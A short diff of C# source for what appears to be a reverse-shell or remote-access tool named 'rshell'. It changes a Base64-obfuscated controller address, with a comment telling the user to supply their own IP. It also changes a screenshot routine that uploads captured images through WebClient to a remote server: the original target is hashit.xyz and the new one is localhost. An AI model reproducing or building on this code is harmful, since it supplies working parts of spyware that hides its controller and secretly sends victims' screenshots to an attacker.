@@ -19,7 +19,7 @@ namespace rshell
         static class Rshell
         {
         
-        static string address = "aHR0cDovLzE5Mi4xNjguMzkuMTM5OjgwODAv"; // Your IP address in Base64 L: aHR0cDovLzE5Mi4xNjguMzkuMTM5OjgwODAv
+        static string address = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLw=="; // Your IP address in Base64 L: aHR0cDovLzEyNy4wLjAuMTo4MDgwLw==
         static string version = "1337";
 
             static string token = Utils.RandomString(15);
@@ -399,7 +399,7 @@ namespace rshell
                                     using (WebClient client = new WebClient())
                                     {
                                         File.WriteAllBytes(filename, bytes);
-                                        byte[] Response = client.UploadFile("https://hashit.xyz/upload.php", "screenshot.jpg");
+                                        byte[] Response = client.UploadFile("http://127.0.0.1/upload.php", Path.GetFullPath(filename));
                                         message.Add("text", "File uploaded");
                                         File.Delete(filename);
                                     }
